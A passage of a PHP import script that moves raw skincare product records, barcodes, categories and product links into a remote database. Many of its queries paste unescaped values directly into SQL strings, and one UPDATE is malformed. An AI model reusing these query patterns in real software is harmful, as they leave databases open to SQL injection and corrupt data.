                $barcodeGTIN=" OR barcode = '$barGtinDup'";
              }
            }else{
              $barcodeGTIN="";
            }
            if(!empty($barGtin14Dup)){

              if($counterbarcode==0){
                $barcodeGTIN14=" barcode = '$barGtin14Dup'";
                $counterbarcode=1;
              }else{
                $barcodeGTIN14=" OR barcode = '$barGtin14Dup'";
              }
              
            }else{
              $barcodeGTIN14="";
            }
            if(!empty($barUpcDup)){
              if($counterbarcode==0){
                $barcodeUPC=" barcode = '$barUpcDup'";
                $counterbarcode=1;
              }else{
                $barcodeUPC=" OR barcode = '$barUpcDup'";
              }
              
            }else{
              $barcodeUPC="";
            }
            if(!empty($barUpcaDup)){
              if($counterbarcode==0){
                $barcodeUPCA=" barcode = '$barUpcaDup'";
                $counterbarcode=1;
              }else{
                $barcodeUPCA=" OR barcode = '$barUpcaDup'";
              }
              
            }else{
              $barcodeUPCA="";
            }
            $scpidhasduplicate="";
            $scpidhasduplicate2="";
            $countDup=0;
            $countDup2=0;
            $countDup3=0;
            if($counterbarcode!=0){
              $sqlDup = "Select SCP_id from SkinCareProductBarcode where  $barcodeEAN13  $barcodeGTIN  $barcodeGTIN14  $barcodeUPC  $barcodeUPCA";
              
              $stmtDup = $dbRemote->query($sqlDup);  
              $dupValidation = $stmtDup->fetchAll(PDO::FETCH_ASSOC);
              //echo $stmtASIN->rowCount();
              $countDup = count($dupValidation);
              //echo json_encode($dupValidation);
              $stmt2 = $dbRemote->prepare($sqlDup);
              $stmt2->execute();
              $result = $stmt2->fetchAll();
              foreach ($result as $rowValue) {

                $scpidhasduplicate= $rowValue['SCP_id'];
                $scpidhasduplicate2= $rowValue['SCP_id'];
                $sqlDup2 = "Select * from skincareproduct where  SCP_id=".$scpidhasduplicate." AND approval_flag='Y'";
                
              $stmtDup2 = $dbRemote->query($sqlDup2);  
              $dupValidation2 = $stmtDup2->fetchAll(PDO::FETCH_ASSOC);
              //echo $stmtASIN->rowCount();
              $countDup3 = count($dupValidation2);
              if($countDup3!=0)
                $countDup2=1;
              }
            }else{
              $countDup=0;
            }
            
            if($countDup!= 0||$countDup2!=0)
            echo "scpb:".$countDup."  scp:".$countDup2."--";
            if($countDup2==0){
            
            
            //Define an Array
            $foreignformattedArray = array();
            $foreignDataArray = array();
            
            
            foreach($depSCPArray['SCP_dep'] as $key => $value){
              
              //print_r($value);
              if (!isset($foreignformattedArray[$key])) $foreignformattedArray[$key] = array();
            
              //*** product_type_id
              $prodType = $value['product_type_name'];
              //Get prodType from Remote DB
              $sqlProdType = "Select product_type_id FROM ProductType Where product_type_name = '$prodType' ";
              $stmtProdType = $dbRemote->query($sqlProdType);  
              $prodTypeID = $stmtProdType->fetchAll(PDO::FETCH_ASSOC);
              //$dbLocal = null;
              $product_type_id = $prodTypeID[0]['product_type_id'];
              $foreignformattedArray[$key]['product_type_id'] = $product_type_id;
              
              //*** product_categories_id_id
              $prodCat = $value['product_categories_name'];
              //Get prodType from Remote DB
              $sqlProdCat = "Select product_categories_id FROM ProductCategories Where product_categories_name = '$prodCat' ";
              $stmtProdCat = $dbRemote->query($sqlProdCat);  
              $prodCatID = $stmtProdCat->fetchAll(PDO::FETCH_ASSOC);
              //print_r($prodCatID);
              $product_categories_id = $prodCatID[0]['product_categories_id'];
              $foreignformattedArray[$key]['product_categories_id'] = $product_categories_id;
              
              //*** product_textures_id
              foreach($value['textures'] as $key => $valueText){
                $notNullTexture = array_filter($valueText);
                //$keyTexture = array_search ('V', $notNullTexture);
                $keyTexture = key($notNullTexture); 
              }; 
              $prodTexture =  $keyTexture;
              //Get prodType from Remote DB
              $sqlProdtext = "Select product_textures_id FROM ProductTextures Where product_textures_name = '$prodTexture' ";
              $stmtProdtext = $dbRemote->query($sqlProdtext);  
              $prodTextID = $stmtProdtext->fetchAll(PDO::FETCH_ASSOC);
              $product_textures_id = $prodTextID[0]['product_textures_id'];
              $foreignformattedArray[$key]['product_textures_id'] = $product_textures_id;
              
              
              //*** gender
              foreach($value['gender'] as $key => $valueGender){
                //$TestArr = array('female' => 'V', 'male' => 'V');
                $notNullGender = array_filter($valueGender);
              
                if (array_key_exists('female', $notNullGender) && array_key_exists('male', $notNullGender) ) {
                  $genderID = "2";
                }else if (array_key_exists('female', $notNullGender)){
                  $genderID = "0";
                }else if (array_key_exists('male', $notNullGender)){
                  $genderID = "1";
                }else{
                  $genderID = NULL;
                }
                
              }; 
              $foreignformattedArray[$key]['genderID'] = $genderID;
              
              //*** Time To Use
              foreach($value['timeToUse'] as $key => $valuetToUse){
                //$TestArr = array('female' => 'V', 'male' => 'V');
                $notNulltToUse = array_filter($valuetToUse);
              
                if (array_key_exists('dayTime', $notNulltToUse) && array_key_exists('nightTime', $notNulltToUse) ) {
                  $timeToUseID = "2";
                }else if (array_key_exists('dayTime', $notNulltToUse)){
                  $timeToUseID = "0";
                }else if (array_key_exists('nightTime', $notNulltToUse)){
                  $timeToUseID = "1";
                }else{
                  $timeToUseID = NULL;
                }
                
              }; 
              $foreignformattedArray[$key]['timeToUseID'] = $timeToUseID;
              
            };
            $foreignSCPArray['SCP_fk'] = $foreignformattedArray;
            //print_r($foreignDataArray);
            //echo json_encode($foreignSCPArray);
              
            //*************************************************** Junction Table/ Many to Many Relationship ****************************************
            
            //Define an Array
            $mapSCPArray = array();
            $mapTblArray = array();
            $skinTypeMapArr = array();
            $appAreaMapArr = array();
            $byConcernMapArr = array();
            $prefMapArr = array();
            $prodLink = array();
            
            
            
            //**Skin Type
             foreach($depSCPArray['SCP_dep'][0]['skinType'] as $skinTypeVal){
            //print_r($skinTypeVal);
            $notNullSkinType = array_filter($skinTypeVal);
            $skinTypeSelKey = array_keys($notNullSkinType);
            //print_r($skinTypeSelKey);
            
              foreach($skinTypeSelKey as $value){
               $sqlSkinType = "Select skin_type_id from SkinType where skin_type_name = '$value' ";
               $stmtsqlSkinType = $dbRemote->query($sqlSkinType);  
               $skinTypeID = $stmtsqlSkinType->fetchAll(PDO::FETCH_ASSOC);
               //print_r($prodTextFetch);
               $ctr++;
               $skinTypeMapArr =  array_merge($skinTypeMapArr, array($ctr=>$skinTypeID[0])); 
              }
            $mapTblArray['skinType'] = $skinTypeMapArr;
            //print_r($mapTblArray);
             }; 
             
             //**Applied Area
             foreach($depSCPArray['SCP_dep'][0]['appArea'] as $appAreaVal){
            $notNullAppArea = array_filter($appAreaVal);
            $AppAreaKey = array_keys($notNullAppArea);
            //print_r($AppAreaKey);
            
              foreach($AppAreaKey as $value){
               $sqlAppArea = "Select product_applied_id from ProductAppliedArea where product_applied_name = '$value' ";
               $stmtsqlAppArea = $dbRemote->query($sqlAppArea);  
               $appAreaID = $stmtsqlAppArea->fetchAll(PDO::FETCH_ASSOC);
               //print_r($prodTextFetch);
               $ctr++;
               $appAreaMapArr =  array_merge($appAreaMapArr, array($ctr=>$appAreaID[0])); 
              }
            $mapTblArray['appArea'] = $appAreaMapArr;
            //print_r($appAreaMapArr);
             }; 
             
             //**By Concern
             foreach($depSCPArray['SCP_dep'][0]['byConcern'] as $byConcernVal){
            $notNullByConcern = array_filter($byConcernVal);
            $byConcernKey = array_keys($notNullByConcern);
            //print_r($byConcernKey);
            
              foreach($byConcernKey as $value){
               $sqlByConcern = "Select general_skin_id from GeneralSkinCondition where general_skin_name = '$value' ";
               $stmtsqlByConcern = $dbRemote->query($sqlByConcern);  
               $byConcernID = $stmtsqlByConcern->fetchAll(PDO::FETCH_ASSOC);
               //print_r($byConcernID);
               $ctr++;
               $byConcernMapArr =  array_merge($byConcernMapArr, array($ctr=>$byConcernID[0])); 
              }
            $mapTblArray['byConcern'] = $byConcernMapArr;
            //print_r($byConcernMapArr);
             };
             
             //**Preference
             foreach($depSCPArray['SCP_dep'][0]['preference'] as $prefVal){
            $notNullPref = array_filter($prefVal);
            $prefKey = array_keys($notNullPref);
            //print_r($prefKey);
            
              foreach($prefKey as $value){
               $sqlpref = "Select product_preference_id from ProductPreference where product_preference_name = '$value' ";
               $stmtsqlPref = $dbRemote->query($sqlpref);  
               $prefID = $stmtsqlPref->fetchAll(PDO::FETCH_ASSOC);
               //print_r($byConcernID);
               $ctr++;
               $prefMapArr =  array_merge($prefMapArr, array($ctr=>$prefID[0])); 
              }
            $mapTblArray['preference'] = $prefMapArr;
            //print_r($prefMapArr);
             };
             
             //**product link tbl
             
            $countRow = 0;
            $iterate = 0;
            foreach($depSCPArray['SCP_dep'][0]['prodLink'] as $prodLinkVal){
            
            $insertProdLink = "INSERT INTO Productlink (Productlink_EC, category, price, price_type)
            VALUES(:Productlink_EC, :category, :price, :price_type)"; 
            
              $stmt2 = $dbRemote->prepare($insertProdLink);  
              $stmt2->bindValue(':Productlink_EC', $prodLinkVal['link']);
              $stmt2->bindValue(':category', $prodLinkVal['linkType']);
              $stmt2->bindValue(':price',$prodLinkVal['price']);
              $stmt2->bindValue(':price_type', $prodLinkVal['priceType']);
              $stmt2->execute();
              
              $lastInID = $dbRemote->lastInsertId();
              $iterate++;
              $prodLink = array_merge($prodLink,array($iterate=>array("id"=>$lastInID)));
              
              //echo json_encode($prodLink);
              
              $countRow += $stmt2->rowCount();
              
            }
            //echo json_encode($prodLink);
            $mapTblArray['prodLink'] = $prodLink;   
          
            
             $mapSCPArray['SCP_map'] = $mapTblArray;
             //echo json_encode($mapSCPArray);
             //print_r($mapSCPArray);
             //print_r($mapSCPArray['SCP_map']['skinType']);
            
            
          
            //*********************************************************Insert Imported SCP in Remote DB*******************************************
             

              $categoriesID = $foreignSCPArray['SCP_fk'][0]['product_categories_id'];
              $typeID = $foreignSCPArray['SCP_fk'][0]['product_type_id'];
              $textureID = $foreignSCPArray['SCP_fk'][0]['product_textures_id'];
              $categoriesSCP = ($categoriesID > 0) ? $categoriesID : 'NULL'; 
              $typeSCP = ($typeID > 0) ? $typeID : 'NULL'; 
              $textureSCP = ($textureID > 0) ? $textureID : 'NULL';
              
              $barcodeEAN13New = "'" .$importedSCPArray['SCP'][0]['barcode_ean13']. "',";
              $barcodeGTINNew = "'" .$importedSCPArray['SCP'][0]['barcode_gtin']. "',";
              $barcodeGTIN14New = "'" . $importedSCPArray['SCP'][0]['barcode_gtin_14']. "',";
              $barcodeUPCNew = "'" .$importedSCPArray['SCP'][0]['barcode_upc']. "',";
              $barcodeUPCANew =  "'" .$importedSCPArray['SCP'][0]['barcode_upca']. "',";
              $brand_namesNew = "N"."'" .str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['brandname'])). "',";
              $country_that_product_sell_inNew = "N"."'" .$importedSCPArray['SCP'][0]['countryprodsell']. "',";
              $effective_periodNew = "'" .$importedSCPArray['SCP'][0]['effectiveperiod']. "',";
              $featuresNew = "N"."'" .str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['features'])). "',";
              $ingrediantNew = "N"."'" .str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['ingredients'])). "',";
              $instructionNew = "N"."'" .str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['instruction'])). "',";
              $manufactured_locationNew = "N"."'" .$importedSCPArray['SCP'][0]['manufacturedloc']. "',";
              $product_namesNew = "N"."'".str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['prodname_maintitle'] )). "',";
              $product_names_subNew = "N"."'" .str_replace("’","''",str_replace("'","''", $importedSCPArray['SCP'][0]['prodname_deputyname'])). "',";
              $product_categories_idNew = $categoriesSCP. ",";
              $product_type_idNew = $typeSCP. ","; 
              $product_textures_idNew = $textureSCP. ",";
              $size_mlNew = "'" .$depSCPArray['SCP_dep'][0]['prodSize'][0]['ml']. "',";
              $size_ozNew = "'" .$depSCPArray['SCP_dep'][0]['prodSize'][0]['oz']. "',";
              $size_pcesNew = "'" .$depSCPArray['SCP_dep'][0]['prodSize'][0]['pcs']. "',";
              $size_gNew = "'" .$depSCPArray['SCP_dep'][0]['prodSize'][0]['gm']. "',";
              $genderNew = "'" .$foreignSCPArray['SCP_fk'][0]['genderID']. "',";
              $time_to_useNew = "'" .$foreignSCPArray['SCP_fk'][0]['timeToUseID']. "',";
              $photosNew = "N"."'" .str_replace("’","''",str_replace("'","''",$importedSCPArray['SCP'][0]['photos_pic'])). "',";
              $product_link_webNew = "N"."'" .$depSCPArray['SCP_dep'][0]['productlink_website']. "',";
              $price_typeNew = "N". "'" .$depSCPArray['SCP_dep'][0]['price_type']. "',";
              $price_webNew = "'" .$depSCPArray['SCP_dep'][0]['price_web']. "'";
              
              $insertconcat = "(" .$barcodeEAN13New. $barcodeGTINNew.$barcodeGTIN14New.$barcodeUPCNew.$barcodeUPCANew.$brand_namesNew.$country_that_product_sell_inNew.$effective_periodNew.
              $featuresNew.$ingrediantNew.$instructionNew.$manufactured_locationNew.$product_namesNew.$product_names_subNew.$product_categories_idNew.$product_textures_idNew.
              $product_type_idNew.$size_mlNew.$size_ozNew.$size_pcesNew.$size_gNew.$genderNew.$time_to_useNew.$photosNew.$product_link_webNew.$price_typeNew.$price_webNew. ")" ;
              //echo $insertconcat;
              
              $insertScp = "INSERT INTO SkincareProduct (barcodeEAN13, barcodeGTIN, barcodeGTIN14, barcodeUPC, barcodeUPCA, brand_names, country_that_product_sell_in,
              effective_period, features, ingrediant, instruction, manufactured_location, product_names, product_names_sub, product_categories_id, product_textures_id, 
              product_type_id, size_ml, size_oz, size_pces, size_g, gender, time_to_use, photos, product_link_web, price_type, price_web)
              VALUES".str_replace("?","''",$insertconcat);
                
                $stmt = $dbRemote->prepare($insertScp);  
                
                if($stmt->execute()){
                  $scpPK = $dbRemote->lastInsertId();
                  //echo $scpPK;
                  
                  
                  //**Insert Items in Barcode
                  //Barcode Array
                  $country = $importedSCPArray['SCP'][0]['region'];
                  $values = '';
                  foreach($depSCPArray['SCP_dep'][0]['barcode'] as $barcodeKey => $barcodeVal){
              
                    foreach($barcodeVal as $key => $val){
                      //echo json_encode($key);
                      $key1 = "'".$key."'";
                      $val1 = "'".$val."'";
                      $country1 = "'".$country."'";
                      $values .= "(".$key1.",".$val1.",".$country1.",".$scpPK."),";
                    }
                  }; 
                  //echo $values;
                  $insertBar = "Insert Into SkincareProductBarcode (barcodetype,barcode,country,SCP_id) Values ".rtrim($values,',');
                  $stmtBar = $dbRemote->prepare($insertBar);
                  $stmtBar->execute();
                  //echo "sucess"; 
                  
            
                  //**Skin Type Mapping
                  foreach($mapSCPArray['SCP_map']['skinType'] as $value){
                  $insertSkinTypeArr = $value;
                  //print_r($insertSkinTypeArr);
                    foreach($insertSkinTypeArr as $valToBeAdd){
                      
                      $sqlSkinTypeMap = "INSERT into ScP_SkinType (skpid, skin_type_id) VALUES (:scpID,:skinTypeID)";
                  
                      $stmt = $dbRemote->prepare($sqlSkinTypeMap);  
                      $stmt->bindValue(':scpID', $scpPK);
                      $stmt->bindValue(':skinTypeID', $valToBeAdd);
                      
                      $stmt->execute();
                      //echo '{"data":{"status":"Successfully Uploaded" }}'; 
                      
                    }; 
                  };
                  
                  
                  //**App Area Mapping
                  foreach($mapSCPArray['SCP_map']['appArea'] as $value){
                    $insertAppAreaArr = $value;
                    //print_r($insertAppAreaArr);
                      foreach($insertAppAreaArr as $valToBeAdd){
                        //print_r($valToBeAdd);
                        $sqlAppAreaMap = "INSERT into ScP_ProductAppliedArea (skpid, product_applied_id) VALUES (:scpID,:appAreaID)";
                      
                        $stmt = $dbRemote->prepare($sqlAppAreaMap);  
                        $stmt->bindValue(':scpID', $scpPK);
                        $stmt->bindValue(':appAreaID', $valToBeAdd);
                        $stmt->execute();
                        
                        //echo '{"data":{"status":"Successfully Uploaded" }}'; 
                        
                      }; 
                  };
                  
                  
                  //**By Concern Mapping
                  foreach($mapSCPArray['SCP_map']['byConcern'] as $value){
                    $insertByConcernArr = $value;
                    //print_r($insertAppAreaArr);
                      foreach($insertByConcernArr as $valToBeAdd){
                        //print_r($valToBeAdd);
                        $sqlByConcernMap = "INSERT into ScP_GeneralSkinCondition (skpid, general_skin_id) VALUES (:scpID,:byConcernID)";
                      
                        $stmt = $dbRemote->prepare($sqlByConcernMap);  
                        $stmt->bindValue(':scpID', $scpPK);
                        $stmt->bindValue(':byConcernID', $valToBeAdd);
                        $stmt->execute();
                        
                        //echo '{"data":{"status":"Successfully Uploaded" }}'; 
                        
                      }; 
                  };
                  
                  //**Product Preference Mapping
                  foreach($mapSCPArray['SCP_map']['preference'] as $value){
                    $insertPrefArr = $value;
                    //print_r($insertAppAreaArr);
                      foreach($insertPrefArr as $valToBeAdd){
                        //print_r($valToBeAdd);
                        $sqlPrefMap = "INSERT into ScP_ProductPreference (skpid, product_preference_id) VALUES (:scpID,:prefID)";
                    
                        $stmt = $dbRemote->prepare($sqlPrefMap);  
                        $stmt->bindValue(':scpID', $scpPK);
                        $stmt->bindValue(':prefID', $valToBeAdd);
                        $stmt->execute();
                        
                        //echo '{"data":{"status":"Successfully Uploaded" }}'; 
                        
                      }; 
                  }; 

                  //**Product Link Mapping
                  foreach($mapSCPArray['SCP_map']['prodLink'] as $value){
                    $insertProdLinkArr = $value;
                    //print_r($insertAppAreaArr);
                      foreach($insertProdLinkArr as $valToBeAdd){
                        //print_r($valToBeAdd);
                        $sqlProdlinkMap = "INSERT into ScP_Productlink (skpid, Productlink_id) VALUES (:scpID,:prodlinkID)";
                    
                        $stmt = $dbRemote->prepare($sqlProdlinkMap);  
                        $stmt->bindValue(':scpID', $scpPK);
                        $stmt->bindValue(':prodlinkID', $valToBeAdd);
                        $stmt->execute();
                        
                        //echo '{"data":{"status":"Successfully Uploaded" }}'; 
                        
                      }; 
                  };
                  
                  //Update Raw SCP 
                  $sqlRawSCPupdate = "Update Raw_SCP_2 SET approval = 1 where id = $id";
              
                    $stmt = $dbRemote->prepare($sqlRawSCPupdate);  
                    $stmt->execute();
                        
                  //$dbRemote = null; 
                  //echo '{"data":{"text":"Successfully Uploaded" }}'; 
                  $succCount+=1;
                  echo $succCount. ".Successfully Uploaded with SCP_id:".$scpPK ."\n"; 
                  $sqlcsvhistoryupdate = "Update BK_Csv_History SET scpid = ".$scpPK." where raw_scp_id = $id";
              
                    $stmtcsv = $dbLocal->prepare($sqlcsvhistoryupdate);  
                    $stmtcsv->execute();
                }; 
                    
              
            }else{
              //Update Raw SCP 
              
              $sqlRawSCPupdate = "Update Raw_SCP_2 SET approval = 1 where id = $id";
                
                $stmt = $dbRemote->prepare($sqlRawSCPupdate);  
                $stmt->execute();
              $succCount+=1;
              echo "*".$succCount. " ID: $id .Duplicate Data Check SCPID:".$scpidhasduplicate2."  \n"; 
              $sqlcsvhistoryupdate = "Update BK_Csv_History SET scpid = Exist where raw_scp_id = $id";
              
                    $stmtcsv = $dbLocal->prepare($sqlcsvhistoryupdate);  
                    $stmtcsv->execute();
              $scpidhasduplicate="";
              $scpidhasduplicate2="";
            }  

            
            
          }else{
            //echo "empty!!";
            echo "Uploaded in SCP Already:".$id."\n"; 
          }
          
          
    //**LOOPING SYTEM END
  }
  //echo json_encode($test);
  
  

});